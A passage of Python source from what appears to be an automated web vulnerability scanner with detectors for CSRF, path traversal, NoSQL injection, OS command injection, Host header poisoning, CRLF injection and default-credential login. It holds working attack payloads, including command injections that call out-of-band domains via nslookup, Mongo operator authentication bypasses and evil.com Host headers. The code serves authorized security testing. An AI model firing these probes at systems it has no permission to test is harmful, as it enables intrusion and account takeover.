            re.search(r"(?i);\s*SameSite\s*=\s*(?:Strict|Lax)", cookie)
            for cookie in set_cookies
        )
        no_custom_header_required = accepted_without_referer
        cors_restrictive = urlparse(url).netloc not in cors_origins
        if not missing_token and not missing_samesite:
            continue
        severity = (
            "HIGH" if missing_token and missing_samesite
            else "MEDIUM" if missing_token
            else "LOW"
        )
        status = "probable" if missing_token else "candidate"
        poc = _csrf_html_poc(url, body)
        evidence = {
            "request_without_referer_or_x_requested_with": _exact_json_request(
                method, url, body
            ),
            "response_status": response.status_code,
            "set_cookie_headers": [
                re.sub(r"(?i)(^|;\s*)[^=;\s]+=[^;]*", r"\1[REDACTED_COOKIE]", cookie)
                for cookie in set_cookies
            ],
            "missing_csrf_token": missing_token,
            "missing_samesite": missing_samesite,
            "no_custom_header_required": no_custom_header_required,
            "cors_restrictive": cors_restrictive,
            "referer_validated": False,
        }
        findings.append(normalize_finding({
            "source": "csrf-class-28",
            "title": "CSRF Protection Missing on Sensitive Endpoint",
            "vuln_type": "CSRF",
            "severity": severity,
            "confidence": 86 if missing_token else 65,
            "url": url,
            "method": method,
            "description": (
                "A sensitive state-changing request was accepted without a CSRF "
                "token, Referer header, or X-Requested-With header."
                if missing_token else
                "A sensitive endpoint issued cookies without Strict/Lax SameSite protection."
            ),
            "evidence": json.dumps(evidence, ensure_ascii=False),
            "html_poc": poc,
            "poc": poc,
            "exploitability_status": status,
            "evidence_strength": "moderate" if missing_token else "weak",
            "false_positive_risk": "medium" if missing_token else "high",
            "business_impact": (
                "An attacker may be able to cause an authenticated victim to change "
                "profile, password, email, settings, or payment state."
            ),
            "remediation": (
                "Require synchronizer CSRF tokens or an equivalent framework defense, "
                "set session cookies SameSite=Lax or Strict, and validate Origin/Referer."
            ),
            "cwe": "CWE-352",
            "cvss": 8.0 if severity == "HIGH" else 6.5 if severity == "MEDIUM" else 3.5,
            "note": "The generated HTML PoC is for authorized testing only.",
            "reproduction_steps": [
                "Authenticate with an authorized disposable test account.",
                "Serve the generated HTML PoC from a different origin.",
                "Verify whether the sensitive state change occurs without user intent.",
            ],
            "redaction_status": "redacted",
        }))
    return findings


def _query_candidates(url, names, value_hints=()):
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    candidates = []
    for name, values in params.items():
        value = values[0] if values else ""
        if (
            name.lower() in names
            or any(hint in value.lower() for hint in value_hints)
        ):
            candidates.append((name, value))
    return candidates


def _url_with_query_value(url, parameter, value):
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    flattened = {key: values[0] if values else "" for key, values in params.items()}
    flattened[parameter] = value
    return parsed._replace(query=urlencode(flattened, safe="%:=")).geturl()


def _body_path_candidates(body, names, value_hints=()):
    candidates = []
    for path in _string_field_paths(body):
        cursor = body
        for part in path:
            cursor = cursor[part]
        field = str(path[-1]).lower() if path else ""
        value = str(cursor)
        if field in names or any(hint in value.lower() for hint in value_hints):
            candidates.append((path, value))
    return candidates


def _lfi_marker(text):
    lowered = (text or "").lower()
    for marker_type, markers in LFI_MARKERS:
        for marker in markers:
            if marker.lower() in lowered:
                return marker_type, marker
    return "", ""


async def hunt_path_traversal_lfi(
    client,
    discovered_urls,
    schema_endpoints,
    base_urls,
):
    findings = []
    tested = set()
    for url in discovered_urls[:150]:
        query_candidates = _query_candidates(
            url, FILE_PATH_PARAM_NAMES, FILE_PATH_VALUE_HINTS
        )[:5]
        if not query_candidates:
            continue
        baseline = await tget(client, url, follow_redirects=False)
        if baseline is None:
            continue
        baseline_size = len(baseline.content or b"")
        for parameter, _original in query_candidates:
            for payload in TRAVERSAL_PAYLOADS:
                key = (url, parameter, payload)
                if key in tested:
                    continue
                tested.add(key)
                test_url = _url_with_query_value(url, parameter, payload)
                response = await tget(client, test_url, follow_redirects=False)
                if response is None:
                    continue
                marker_type, marker = _lfi_marker(response.text)
                if marker and marker.lower() in (baseline.text or "").lower():
                    marker_type, marker = "", ""
                size_delta = abs(len(response.content or b"") - baseline_size)
                if not marker and size_delta <= max(500, baseline_size * 0.50):
                    continue
                confirmed = bool(marker)
                findings.append(normalize_finding({
                    "source": "path-traversal-class-29",
                    "title": (
                        "Path Traversal / LFI Confirmed"
                        if confirmed else "Path Traversal Response Differential"
                    ),
                    "vuln_type": "Path Traversal and LFI",
                    "severity": "HIGH" if confirmed else "MEDIUM",
                    "confidence": 98 if confirmed else 68,
                    "url": url,
                    "method": "GET",
                    "parameter": parameter,
                    "description": (
                        "{} content marker '{}' was returned for a traversal payload."
                        .format(marker_type, marker)
                        if confirmed else
                        "A traversal payload changed the response size materially and requires confirmation."
                    ),
                    "evidence": json.dumps({
                        "request_url": test_url,
                        "payload": payload,
                        "status_code": response.status_code,
                        "marker_type": marker_type,
                        "marker": marker,
                        "baseline_size": baseline_size,
                        "test_size": len(response.content or b""),
                        "size_delta": size_delta,
                        "response_excerpt": _response_excerpt(
                            response.text or "", marker or ""
                        ),
                    }, ensure_ascii=False),
                    "exploitability_status": (
                        "confirmed" if confirmed else "candidate"
                    ),
                    "evidence_strength": "strong" if confirmed else "weak",
                    "false_positive_risk": "low" if confirmed else "high",
                    "business_impact": (
                        "An attacker may read local configuration, credentials, "
                        "source code, or operating-system files."
                    ),
                    "remediation": (
                        "Resolve file access against an allow-listed base directory, "
                        "canonicalize paths, and reject traversal sequences."
                    ),
                    "cwe": "CWE-22",
                    "cvss": 8.1 if confirmed else 5.3,
                    "reproduction_steps": [
                        "Request the baseline URL.",
                        "Replace the recorded parameter with the traversal payload.",
                        "Confirm the file marker or stable response differential.",
                    ],
                    "redaction_status": "redacted",
                }))
                if confirmed:
                    break

    json_endpoints = [
        endpoint for endpoint in (schema_endpoints or [])
        if isinstance(endpoint, dict)
        and str(endpoint.get("method", "")).upper() in XSS_MUTATION_METHODS
        and isinstance(endpoint.get("body"), dict)
        and endpoint.get("url")
    ]
    if not (
        scope_policy.config.authenticated_testing_enabled
        and auth_matrix.configured
        and auth_matrix.mutations_allowed
    ):
        json_endpoints = []
    for endpoint in json_endpoints[:15]:
        candidates = _body_path_candidates(
            endpoint["body"], FILE_PATH_PARAM_NAMES, FILE_PATH_VALUE_HINTS
        )
        if not candidates:
            continue
        url = str(endpoint["url"])
        method = str(endpoint["method"]).upper()
        baseline = await _authenticated_request(
            client, method, url,
            headers={"Content-Type": "application/json"},
            json=endpoint["body"],
        )
        if baseline is None:
            continue
        for path, _value in candidates[:4]:
            for payload in TRAVERSAL_PAYLOADS:
                body = _replace_path(endpoint["body"], path, payload)
                response = await _authenticated_request(
                    client, method, url,
                    headers={"Content-Type": "application/json"},
                    json=body,
                )
                if response is None:
                    continue
                marker_type, marker = _lfi_marker(response.text)
                if marker and marker.lower() in (baseline.text or "").lower():
                    marker_type, marker = "", ""
                if not marker:
                    continue
                findings.append(normalize_finding({
                    "source": "path-traversal-class-29",
                    "title": "Path Traversal / LFI Confirmed",
                    "vuln_type": "Path Traversal and LFI",
                    "severity": "HIGH",
                    "confidence": 98,
                    "url": url,
                    "method": method,
                    "parameter": _path_name(path),
                    "description": "{} content was returned from a JSON file-path field.".format(marker_type),
                    "evidence": json.dumps({
                        "injection_request": _exact_json_request(method, url, body),
                        "payload": payload,
                        "marker": marker,
                        "response_excerpt": _response_excerpt(response.text, marker),
                    }, ensure_ascii=False),
                    "exploitability_status": "confirmed",
                    "evidence_strength": "strong",
                    "false_positive_risk": "low",
                    "business_impact": "Local files can be read through attacker-controlled path input.",
                    "remediation": "Canonicalize and allow-list every server-side file path.",
                    "cwe": "CWE-22",
                    "cvss": 8.1,
                    "redaction_status": "redacted",
                }))
                break

    for base_url in base_urls[:20]:
        parsed = urlparse(base_url)
        origin = "{}://{}".format(parsed.scheme, parsed.netloc)
        for path in DIRECTORY_LISTING_PATHS:
            listing_url = urljoin(origin + "/", path.lstrip("/"))
            response = await tget(client, listing_url, follow_redirects=False)
            if response is None or response.status_code != 200:
                continue
            text = response.text or ""
            listing = bool(
                re.search(r"(?i)<title>\s*Index of\b|<h1>\s*Index of\b", text)
                or (
                    re.search(r"(?i)directory listing", text)
                    and re.search(r"(?i)href=[\"'][^\"']+[/\"']", text)
                )
            )
            if not listing:
                continue
            findings.append(normalize_finding({
                "source": "path-traversal-class-29",
                "title": "Directory Listing Enabled",
                "vuln_type": "directory_listing_enabled",
                "severity": "MEDIUM",
                "confidence": 96,
                "url": listing_url,
                "method": "GET",
                "description": "The server returned an automatically generated directory index.",
                "evidence": text[:1200],
                "exploitability_status": "confirmed",
                "evidence_strength": "strong",
                "false_positive_risk": "low",
                "business_impact": "Directory indexes may expose backups, logs, uploads, or internal filenames.",
                "remediation": "Disable directory indexing and restrict access to storage paths.",
                "cwe": "CWE-538",
                "cvss": 5.3,
                "redaction_status": "redacted",
            }))
    return findings


def _json_field_set(response):
    if response is None:
        return set()
    try:
        payload = response.json()
    except ValueError:
        return set()
    return set(_json_keys(payload))


def _json_keys(value, prefix=""):
    keys = []
    if isinstance(value, dict):
        for key, nested in value.items():
            path = "{}.{}".format(prefix, key) if prefix else str(key)
            keys.append(path)
            keys.extend(_json_keys(nested, path))
    elif isinstance(value, list) and value:
        keys.extend(_json_keys(value[0], "{}[]".format(prefix)))
    return keys


async def hunt_nosql_injection(client, schema_endpoints):
    findings = []
    endpoints = [
        endpoint for endpoint in (schema_endpoints or [])
        if isinstance(endpoint, dict)
        and str(endpoint.get("method", "")).upper() == "POST"
        and str(endpoint.get("content_type", "")).lower() == "application/json"
        and isinstance(endpoint.get("body"), dict)
        and endpoint.get("url")
    ]
    if not (
        scope_policy.config.authenticated_testing_enabled
        and auth_matrix.configured
        and auth_matrix.mutations_allowed
    ):
        endpoints = []
    for endpoint in endpoints[:15]:
        url = str(endpoint["url"])
        original = endpoint["body"]
        baseline_started = time.monotonic()
        baseline = await _authenticated_request(
            client, "POST", url,
            headers={"Content-Type": "application/json"},
            json=original,
        )
        baseline_elapsed = time.monotonic() - baseline_started
        if baseline is None:
            continue
        string_paths = _string_field_paths(original)
        payloads = []
        for path in string_paths[:5]:
            payloads.append((
                "mongo_ne",
                _replace_path(original, path, {"$ne": None}),
                _path_name(path),
            ))
        auth_fields = {
            str(path[-1]).lower(): path for path in string_paths if path
        }
        if "username" in auth_fields and "password" in auth_fields:
            body = _replace_path(original, auth_fields["username"], {"$regex": ".*"})
            body = _replace_path(body, auth_fields["password"], {"$ne": ""})
            payloads.append(("mongo_regex_auth", body, "username,password"))
        payloads.append((
            "where_sleep_timing",
            {**copy.deepcopy(original), "$where": "sleep(3000)"},
            "$where",
        ))
        payloads.append((
            "where_function_timing",
            {**copy.deepcopy(original), "$where": (
                "function(){var d=new Date();while(new Date()-d<3000){}return true;}"
            )},
            "$where",
        ))

        for payload_type, body, parameter in payloads[:8]:
            started = time.monotonic()
            response = await _authenticated_request(
                client, "POST", url,
                headers={"Content-Type": "application/json"},
                json=body,
            )
            elapsed = time.monotonic() - started
            if response is None:
                continue
            extra_fields = _json_field_set(response) - _json_field_set(baseline)
            extra_data = bool(
                response.status_code == 200
                and extra_fields
                and len(response.content or b"") > len(baseline.content or b"")
            )
            auth_bypass = (
                response.status_code == 200
                and baseline.status_code in {401, 403}
            )
            delayed = elapsed - baseline_elapsed > 2.5
            status_changed = response.status_code != baseline.status_code
            if not (auth_bypass or extra_data or delayed or status_changed):
                continue
            if auth_bypass or extra_data:
                status, severity, confidence = "confirmed", "CRITICAL", 96
            elif delayed:
                status, severity, confidence = "probable", "HIGH", 84
            else:
                status, severity, confidence = "candidate", "HIGH", 68
            findings.append(normalize_finding({
                "source": "nosql-injection-class-30",
                "title": "NoSQL Injection {}".format(status.title()),
                "vuln_type": "NoSQL Injection",
                "severity": severity,
                "confidence": confidence,
                "url": url,
                "method": "POST",
                "parameter": parameter,
                "description": (
                    "A MongoDB-style operator payload changed authentication, "
                    "response data, status, or timing."
                ),
                "evidence": json.dumps({
                    "payload_type": payload_type,
                    "request": _exact_json_request("POST", url, body),
                    "baseline_status": baseline.status_code,
                    "test_status": response.status_code,
                    "baseline_time_ms": round(baseline_elapsed * 1000, 2),
                    "test_time_ms": round(elapsed * 1000, 2),
                    "additional_json_fields": sorted(extra_fields),
                    "response_excerpt": (response.text or "")[:1000],
                }, ensure_ascii=False),
                "exploitability_status": status,
                "evidence_strength": "strong" if status == "confirmed" else "moderate" if status == "probable" else "weak",
                "false_positive_risk": "low" if status == "confirmed" else "medium" if status == "probable" else "high",
                "business_impact": "NoSQL operator injection may bypass authentication or expose unauthorized records.",
                "remediation": "Enforce scalar schemas, reject keys beginning with '$', and use safe query builders.",
                "cwe": "CWE-943",
                "cvss": 9.1 if severity == "CRITICAL" else 8.0,
                "redaction_status": "redacted",
            }))
            if status == "confirmed":
                break

        for parameter in ("user[$ne]", "user[$regex]", "password[$gt]"):
            value = "none" if "$ne" in parameter else ".*" if "$regex" in parameter else ""
            query_url = _url_with_query_value(url, parameter, value)
            response = await _authenticated_request(
                client, "POST", query_url,
                headers={"Content-Type": "application/json"},
                json=original,
            )
            if response is None or response.status_code == baseline.status_code:
                continue
            findings.append(normalize_finding({
                "source": "nosql-injection-class-30",
                "title": "NoSQL Query Operator Candidate",
                "vuln_type": "NoSQL Injection",
                "severity": "HIGH",
                "confidence": 66,
                "url": url,
                "method": "POST",
                "parameter": parameter,
                "description": "A bracket-notation query operator changed the response status.",
                "evidence": "POST {} -> HTTP {} (baseline {})".format(
                    query_url, response.status_code, baseline.status_code
                ),
                "exploitability_status": "candidate",
                "evidence_strength": "weak",
                "false_positive_risk": "high",
                "business_impact": "Operator parsing may allow query manipulation.",
                "remediation": "Disable bracket operator parsing and enforce strict parameter schemas.",
                "cwe": "CWE-943",
                "cvss": 7.5,
                "redaction_status": "not_required",
            }))
            break
    return findings


def _command_value_candidate(name, value):
    if str(name).lower() in COMMAND_PARAM_NAMES:
        return True
    value = str(value)
    return bool(
        re.search(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", value)
        or re.search(r"(?i)\b[a-z0-9-]+(?:\.[a-z0-9-]+)+\b", value)
    )


async def hunt_os_command_injection(client, discovered_urls, schema_endpoints):
    findings = []
    for url in discovered_urls[:120]:
        candidates = [
            (name, value) for name, value in _query_candidates(
                url, COMMAND_PARAM_NAMES
            ) if _command_value_candidate(name, value)
        ]
        if not candidates:
            continue
        baseline = await _measure_baseline(client, url, n=2)
        for parameter, original in candidates[:4]:
            nonce = "burpollama_{}".format(secrets.token_hex(5))
            probes = [
                ("echo", "{} | echo {}".format(original, nonce)),
                ("sleep", "{}; sleep 4;".format(original)),
                ("timeout", "{} | timeout 4".format(original)),
            ]
            oob_url = oob.generate_payload(CTX_RCE_PARAM, parameter, url)
            if oob_url:
                domain = oob_url.replace("http://", "").rstrip("/")
                probes.insert(0, ("oob", "{}; nslookup {}".format(original, domain)))
                probes.insert(1, ("oob", "{}$(nslookup {})".format(original, domain)))
            for probe_type, payload in probes:
                test_url = _url_with_query_value(url, parameter, payload)
                started = time.monotonic()
                response = await tget(client, test_url, follow_redirects=False)
                elapsed = time.monotonic() - started
                if response is None:
                    continue
                if probe_type == "oob":
                    oob.annotate_payload(oob_url, {
                        "injection_request": "GET {}".format(test_url),
                        "injected_payload": payload,
                        "method": "GET",
                    })
                    continue
                response_text = response.text or ""
                echoed = nonce in response_text and payload not in response_text
                delayed = elapsed > baseline + 3.5
                if not echoed and not delayed:
                    continue
                status = "confirmed" if echoed else "probable"
                findings.append(normalize_finding({
                    "source": "command-injection-class-31",
                    "title": "OS Command Injection {}".format(status.title()),
                    "vuln_type": "OS Command Injection",
                    "severity": "CRITICAL",
                    "confidence": 98 if echoed else 84,
                    "url": url,
                    "method": "GET",
                    "parameter": parameter,
                    "description": (
                        "The command echo marker was returned by the application."
                        if echoed else
                        "A safe sleep/timeout payload delayed the response materially."
                    ),
                    "evidence": json.dumps({
                        "request_url": test_url,
                        "probe_type": probe_type,
                        "baseline_seconds": round(baseline, 3),
                        "test_seconds": round(elapsed, 3),
                        "echo_marker": nonce if echoed else "",
                        "response_excerpt": _response_excerpt(
                            response.text or "", nonce if echoed else ""
                        ),
                    }, ensure_ascii=False),
                    "exploitability_status": status,
                    "evidence_strength": "strong" if echoed else "moderate",
                    "false_positive_risk": "low" if echoed else "medium",
                    "business_impact": "OS command execution may lead to complete server compromise.",
                    "remediation": "Never invoke a shell with user input; use safe APIs and strict allow-lists.",
                    "cwe": "CWE-78",
                    "cvss": 10.0,
                    "redaction_status": "redacted",
                }))
                break

    endpoints = [
        endpoint for endpoint in (schema_endpoints or [])
        if isinstance(endpoint, dict)
        and str(endpoint.get("method", "")).upper() in XSS_MUTATION_METHODS
        and isinstance(endpoint.get("body"), dict)
        and endpoint.get("url")
    ]
    if not (
        scope_policy.config.authenticated_testing_enabled
        and auth_matrix.configured
        and auth_matrix.mutations_allowed
    ):
        endpoints = []
    for endpoint in endpoints[:12]:
        url = str(endpoint["url"])
        method = str(endpoint["method"]).upper()
        candidates = [
            (path, value) for path, value in _body_path_candidates(
                endpoint["body"], COMMAND_PARAM_NAMES
            ) if _command_value_candidate(path[-1], value)
        ]
        if not candidates:
            continue
        baseline_started = time.monotonic()
        baseline_response = await _authenticated_request(
            client, method, url,
            headers={"Content-Type": "application/json"},
            json=endpoint["body"],
        )
        baseline = time.monotonic() - baseline_started
        if baseline_response is None:
            continue
        for path, original in candidates[:3]:
            nonce = "burpollama_{}".format(secrets.token_hex(5))
            payloads = [
                ("echo", "{} | echo {}".format(original, nonce)),
                ("sleep", "{}; sleep 4;".format(original)),
            ]
            oob_url = oob.generate_payload(
                CTX_RCE_PARAM, _path_name(path), url
            )
            if oob_url:
                domain = oob_url.replace("http://", "").rstrip("/")
                payloads.insert(0, (
                    "oob", "{}; nslookup {}".format(original, domain)
                ))
            for probe_type, payload in payloads:
                body = _replace_path(endpoint["body"], path, payload)
                request_text = _exact_json_request(method, url, body)
                started = time.monotonic()
                response = await _authenticated_request(
                    client, method, url,
                    headers={"Content-Type": "application/json"},
                    json=body,
                )
                elapsed = time.monotonic() - started
                if response is None:
                    continue
                if probe_type == "oob":
                    oob.annotate_payload(oob_url, {
                        "injection_request": request_text,
                        "injected_payload": payload,
                        "method": method,
                    })
                    continue
                response_text = response.text or ""
                echoed = nonce in response_text and payload not in response_text
                delayed = elapsed > baseline + 3.5
                if not echoed and not delayed:
                    continue
                status = "confirmed" if echoed else "probable"
                findings.append(normalize_finding({
                    "source": "command-injection-class-31",
                    "title": "OS Command Injection {}".format(status.title()),
                    "vuln_type": "OS Command Injection",
                    "severity": "CRITICAL",
                    "confidence": 98 if echoed else 84,
                    "url": url,
                    "method": method,
                    "parameter": _path_name(path),
                    "description": "A safe command probe produced an echo or timing oracle.",
                    "evidence": json.dumps({
                        "request": request_text,
                        "probe_type": probe_type,
                        "baseline_seconds": round(baseline, 3),
                        "test_seconds": round(elapsed, 3),
                        "echo_marker": nonce if echoed else "",
                        "response_excerpt": _response_excerpt(
                            response.text or "", nonce if echoed else ""
                        ),
                    }, ensure_ascii=False),
                    "exploitability_status": status,
                    "evidence_strength": "strong" if echoed else "moderate",
                    "false_positive_risk": "low" if echoed else "medium",
                    "business_impact": "OS command execution may lead to complete server compromise.",
                    "remediation": "Avoid shells and validate every command argument against an allow-list.",
                    "cwe": "CWE-78",
                    "cvss": 10.0,
                    "redaction_status": "redacted",
                }))
                break
    return findings


async def hunt_host_header_injection(client, live_hosts, discovered_urls):
    findings = []
    reset_paths = [
        url for url in discovered_urls
        if re.search(r"(?i)/(?:password/reset|forgot-password|forgot)", urlparse(url).path)
    ]
    for host_record in (live_hosts or [])[:30]:
        base_url = (
            str(host_record.get("url", ""))
            if isinstance(host_record, dict) else str(host_record)
        )
        if not base_url:
            continue
        parsed = urlparse(base_url)
        target_host = parsed.netloc
        baseline = await tget(client, base_url, follow_redirects=False)
        baseline_body = (baseline.text or "") if baseline is not None else ""
        baseline_headers = (
            list(baseline.headers.values()) if baseline is not None else []
        )
        probes = [
            ("Host", {"Host": "evil.com"}),
            ("X-Forwarded-Host", {"X-Forwarded-Host": "evil.com"}),
            ("X-Host", {"X-Host": "evil.com"}),
            ("X-Forwarded-Server", {"X-Forwarded-Server": "evil.com"}),
            ("Host port injection", {"Host": "{}:evil.com".format(target_host)}),
        ]
        for probe_name, headers in probes:
            response = await tget(
                client, base_url,
                headers={**BASE_HEADERS, **headers},
                follow_redirects=False,
            )
            if response is None:
                continue
            body_reflected = (
                "evil.com" in (response.text or "")
                and "evil.com" not in baseline_body
            )
            reflected_headers = {
                key: value for key, value in response.headers.items()
                if "evil.com" in value
                and not any("evil.com" in baseline_value for baseline_value in baseline_headers)
            }
            if not body_reflected and not reflected_headers:
                continue
            status = "confirmed" if body_reflected else "probable"
            findings.append(normalize_finding({
                "source": "host-header-class-32",
                "title": "Host Header Injection Reflection",
                "vuln_type": "host_header_reflected",
                "severity": "MEDIUM",
                "confidence": 94 if body_reflected else 82,
                "url": base_url,
                "method": "GET",
                "parameter": probe_name,
                "description": "An attacker-controlled host value was reflected in the response.",
                "evidence": json.dumps({
                    "request_headers": headers,
                    "status_code": response.status_code,
                    "body_excerpt": _response_excerpt(
                        response.text or "", "evil.com"
                    ) if body_reflected else "",
                    "reflected_response_headers": reflected_headers,
                }, ensure_ascii=False),
                "exploitability_status": status,
                "evidence_strength": "strong" if body_reflected else "moderate",
                "false_positive_risk": "low" if body_reflected else "medium",
                "business_impact": "Host header trust may enable poisoned links, redirects, or cache entries.",
                "remediation": "Use a fixed canonical host and reject unrecognized Host/forwarded-host values.",
                "cwe": "CWE-20",
                "cvss": 6.5,
                "redaction_status": "not_required",
            }))
            break

    for reset_url in reset_paths[:15]:
        baseline = await tget(client, reset_url, follow_redirects=False)
        baseline_body = (baseline.text or "") if baseline is not None else ""
        baseline_headers = (
            list(baseline.headers.values()) if baseline is not None else []
        )
        response = await tget(
            client, reset_url,
            headers={**BASE_HEADERS, "Host": "evil.com"},
            follow_redirects=False,
        )
        if response is None:
            continue
        body_reflected = (
            "evil.com" in (response.text or "")
            and "evil.com" not in baseline_body
        )
        header_reflected = (
            any("evil.com" in value for value in response.headers.values())
            and not any("evil.com" in value for value in baseline_headers)
        )
        if body_reflected or header_reflected:
            status = "confirmed" if body_reflected else "probable"
        elif response.status_code < 400:
            status = "candidate"
        else:
            continue
        findings.append(normalize_finding({
            "source": "host-header-class-32",
            "title": "Password Reset Host Header Poisoning Candidate",
            "vuln_type": "Host Header Password Reset Poisoning",
            "severity": "HIGH",
            "confidence": 92 if status == "confirmed" else 80 if status == "probable" else 62,
            "url": reset_url,
            "method": "GET",
            "parameter": "Host",
            "description": (
                "The reset surface reflected the attacker-controlled host."
                if status != "candidate" else
                "The password-reset endpoint accepted an unrecognized Host header; email-link impact requires manual confirmation."
            ),
            "evidence": json.dumps({
                "request_header": "Host: evil.com",
                "status_code": response.status_code,
                "body_reflected": body_reflected,
                "header_reflected": header_reflected,
                "body_excerpt": _response_excerpt(
                    response.text or "", "evil.com"
                ) if body_reflected else "",
            }, ensure_ascii=False),
            "exploitability_status": status,
            "evidence_strength": "strong" if status == "confirmed" else "moderate" if status == "probable" else "weak",
            "false_positive_risk": "low" if status == "confirmed" else "medium" if status == "probable" else "high",
            "business_impact": "Poisoned password-reset links could disclose reset tokens and enable account takeover.",
            "remediation": "Build reset URLs from a configured canonical origin and reject invalid Host headers.",
            "cwe": "CWE-20",
            "cvss": 8.1,
            "note": "No reset email was sent; candidate status requires authorized email-flow validation.",
            "redaction_status": "redacted",
        }))
    return findings


def _crlf_header_injected(response):
    return any(
        "burpollama=test" in value.lower()
        for value in response.headers.get_list("set-cookie")
    )


def _crlf_location_reflected(response):
    location = response.headers.get("location", "")
    lowered = location.lower()
    return bool(
        "burpollama=test" in lowered
        or "set-cookie%3aburpollama%3dtest" in lowered
        or "%0d%0a" in lowered
        or "%0a" in lowered
        or "%e5%98%8a%e5%98%8d" in lowered
    )


async def hunt_crlf_injection(client, discovered_urls):
    """Detect response splitting without sending raw control characters."""
    findings = []
    tested = set()
    for url in discovered_urls[:150]:
        parsed = urlparse(url)
        if parsed.scheme not in {"http", "https"}:
            continue
        baseline = await tget(client, url, follow_redirects=False)
        baseline_cookie_injected = bool(
            baseline and _crlf_header_injected(baseline)
        )
        baseline_location = (
            baseline.headers.get("location", "").lower()
            if baseline is not None else ""
        )
        params = parse_qs(parsed.query, keep_blank_values=True)
        probes = []
        for parameter in list(params.keys())[:10]:
            for payload in CRLF_PAYLOADS:
                probes.append((
                    parameter,
                    payload,
                    _url_with_query_value(url, parameter, payload),
                ))
        path = parsed.path or "/"
        for payload in CRLF_PAYLOADS:
            probes.append((
                "URL path",
                payload,
                parsed._replace(path=path.rstrip("/") + "/" + payload).geturl(),
            ))

        for parameter, payload, test_url in probes[:44]:
            key = (test_url, parameter)
            if key in tested:
                continue
            tested.add(key)
            response = await tget(client, test_url, follow_redirects=False)
            if response is None:
                continue
            header_injected = (
                _crlf_header_injected(response)
                and not baseline_cookie_injected
            )
            location_reflected = (
                _crlf_location_reflected(response)
                and response.headers.get("location", "").lower()
                != baseline_location
            )
            if not header_injected and not location_reflected:
                continue
            status = "confirmed" if header_injected else "probable"
            findings.append(normalize_finding({
                "source": "crlf-injection-class-33",
                "title": (
                    "HTTP Response Splitting Confirmed"
                    if header_injected else "CRLF Redirect Reflection"
                ),
                "vuln_type": "CRLF Injection",
                "severity": "MEDIUM",
                "confidence": 98 if header_injected else 82,
                "url": url,
                "method": "GET",
                "parameter": parameter,
                "description": (
                    "The injected Set-Cookie header appeared in the response."
                    if header_injected else
                    "The redirect Location header preserved the CRLF injection sequence."
                ),
                "evidence": json.dumps({
                    "request_url": test_url,
                    "payload": payload,
                    "status_code": response.status_code,
                    "set_cookie_headers": response.headers.get_list("set-cookie"),
                    "location": response.headers.get("location", ""),
                }, ensure_ascii=False),
                "exploitability_status": status,
                "evidence_strength": "strong" if header_injected else "moderate",
                "false_positive_risk": "low" if header_injected else "medium",
                "business_impact": (
                    "Response splitting can poison headers or cookies and may enable "
                    "stored XSS through attacker-controlled header injection."
                ),
                "remediation": (
                    "Reject CR/LF characters after every decoding layer and never "
                    "build response headers from untrusted input."
                ),
                "cwe": "CWE-93",
                "cvss": 6.5,
                "note": "This can enable stored XSS via header injection.",
                "reproduction_steps": [
                    "Send the recorded encoded request URL.",
                    "Inspect response headers without following redirects.",
                    "Confirm the injected cookie or reflected redirect sequence.",
                ],
                "redaction_status": "not_required",
            }))
            break
    return findings


def _login_field_names(endpoint):
    body = endpoint.get("body") if isinstance(endpoint, dict) else {}
    paths = _string_field_paths(body) if isinstance(body, dict) else []
    username_path = next((
        path for path in paths
        if str(path[-1]).lower() in {
            "username", "user", "login", "email", "identifier",
        }
    ), None)
    password_path = next((
        path for path in paths
        if str(path[-1]).lower() in {
            "password", "pass", "passwd", "pwd",
        }
    ), None)
    return username_path, password_path


def _login_success(response):
    text = response.text or ""
    lowered = text.lower()
    location = response.headers.get("location", "").lower()
    has_session_cookie = any(
        re.search(r"(?i)(session|auth|token|jwt|sid)", cookie)
        and not re.search(r"(?i)max-age\s*=\s*0", cookie)
        and bool(re.match(r"[^=]+=(?P<value>[^;]+)", cookie))
        for cookie in response.headers.get_list("set-cookie")
    )
    token_in_json = False
    try:
        payload = response.json()
        token_in_json = isinstance(payload, dict) and any(
            key.lower() in {
                "token", "access_token", "id_token", "jwt", "session",
                "sessionid",
            }
            and bool(value)
            for key, value in payload.items()
        )
    except ValueError:
        pass
    dashboard_redirect = (
        response.status_code in {301, 302, 303, 307, 308}
        and any(hint in location for hint in (
            "dashboard", "account", "profile", "home", "admin",
        ))
    )
    no_error = not any(term in lowered for term in LOGIN_ERROR_TERMS)
    no_login_form = not (
        re.search(r"(?i)<input[^>]+type=[\"']?password", text)
        or re.search(r"(?i)\b(?:login|sign in)\b", text[:1500])
    )
    authenticated_page = any(
        term in lowered for term in (
            "logout", "sign out", "my account", "dashboard", "welcome",
        )
    )
    success = bool(
        token_in_json
        or has_session_cookie
        or dashboard_redirect
        or (
            response.status_code == 200
            and no_error
            and no_login_form
            and authenticated_page
        )
    )
    return success, {
        "token_in_json": token_in_json,
        "session_cookie_set": has_session_cookie,
        "dashboard_redirect": dashboard_redirect,
        "absence_of_error": no_error,
        "login_form_absent": no_login_form,
        "authenticated_page_indicator": authenticated_page,
    }


async def hunt_default_credentials(client, discovered_urls, schema_endpoints):
    """Try at most ten documented defaults and stop after success or lockout."""
    endpoint_metadata = {
        str(endpoint.get("url", "")): endpoint
        for endpoint in (schema_endpoints or [])
        if isinstance(endpoint, dict) and endpoint.get("url")
    }
    login_urls = list(dict.fromkeys(
        url for url in discovered_urls
        if LOGIN_PATH_RE.search(urlparse(url).path + "/")
    ))[:20]
    findings = []
    for url in login_urls:
        endpoint = endpoint_metadata.get(url, {})
        content_type = str(endpoint.get("content_type", "")).lower()
        use_json = content_type == "application/json"
        username_path, password_path = _login_field_names(endpoint)
        template = (
            copy.deepcopy(endpoint.get("body"))
            if isinstance(endpoint.get("body"), dict) else {}
        )

        for attempt_number, (username, password) in enumerate(
            DEFAULT_CREDENTIALS, start=1
        ):
            if use_json:
                body = copy.deepcopy(template)
                if username_path and password_path:
                    body = _replace_path(body, username_path, username)
                    body = _replace_path(body, password_path, password)
                else:
                    body.update({"username": username, "password": password})
                response = await tpost(
                    client,
                    url,
                    headers={"Content-Type": "application/json"},
                    json=body,
                    follow_redirects=False,
                )
                redacted_body = copy.deepcopy(body)
                if password_path:
                    redacted_body = _replace_path(
                        redacted_body, password_path, "[REDACTED]"
                    )
                else:
                    redacted_body["password"] = "[REDACTED]"
                request_evidence = _exact_json_request(
                    "POST", url, redacted_body
                )
            else:
